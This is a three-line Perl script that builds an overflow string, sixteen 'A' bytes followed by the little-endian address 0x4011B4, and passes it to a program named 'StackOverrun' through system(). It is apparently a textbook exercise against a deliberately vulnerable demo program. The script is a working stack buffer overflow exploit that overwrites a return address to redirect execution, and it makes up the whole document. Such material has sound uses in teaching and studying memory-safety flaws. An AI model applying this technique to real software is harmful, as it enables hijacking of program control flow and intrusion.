$arg = "AAAAAAAAAAAAAAAA"."\xB4\x11\x40";
$cmd = "StackOverrun ".$arg;

system($cmd);

